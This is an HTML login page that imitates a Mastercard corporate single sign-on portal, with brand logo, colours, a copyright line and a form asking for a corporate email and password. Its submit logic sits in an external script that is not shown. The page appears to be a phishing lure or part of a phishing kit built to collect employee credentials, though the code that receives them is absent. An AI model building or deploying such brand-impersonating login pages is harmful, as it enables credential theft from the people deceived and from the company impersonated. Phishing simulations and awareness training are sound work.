<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mastercard | Secure SSO Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="style.css">
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen font-sans">

    <div class="bg-white p-8 rounded-lg shadow-xl w-full max-w-md border-t-4 border-[#EB001B]">
      
        <!-- Mastercard Branding -->
        <div class="flex justify-center mb-6">
            <img src="mastercard-logo.png" alt="Mastercard Logo" class="w-24">
        </div>

        <h2 class="text-2xl font-bold text-gray-800 text-center mb-2">Sign In</h2>
        <p class="text-sm text-gray-500 text-center mb-8">Use your Corporate Credentials to access the Secure Gateway.</p>

        <!-- The Integrated Form -->
        <form id="loginForm" autocomplete="off">
            <div class="mb-4">
                <label class="block text-gray-700 text-sm font-semibold mb-2">Corporate ID / Email</label>
                <input type="email" id="email"
                       class="w-full px-4 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-[#FF5F00] transition"
                       placeholder="nathan@mastercard.com" required autocomplete="off">
            </div>

            <div class="mb-6">
                <label class="block text-gray-700 text-sm font-semibold mb-2">Password</label>
                <input type="password" id="password"
                       class="w-full px-4 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-[#FF5F00] transition"
                       placeholder="••••••••" required autocomplete="off">
            </div>

            <button type="submit"
                    class="w-full bg-[#EB001B] hover:bg-[#cf0018] text-white font-bold py-2 px-4 rounded-md transition duration-300 transform hover:scale-105">
                Authorize Access
            </button>
        </form>

        <div class="mt-8 text-center">
            <p class="text-xs text-gray-400">© 1994-2026 Mastercard. All rights reserved.</p>
        </div>
    </div>

    <!-- 1. Force Reset Script (Prevents "Stuck" inputs on boot) -->
    <script>
        window.onload = () => {
            const form = document.getElementById('loginForm');
            if(form) form.reset();
        };
    </script>

    <!-- 2. Core Logic Script -->
    <script src="script.js"></script>
</body>
</html>
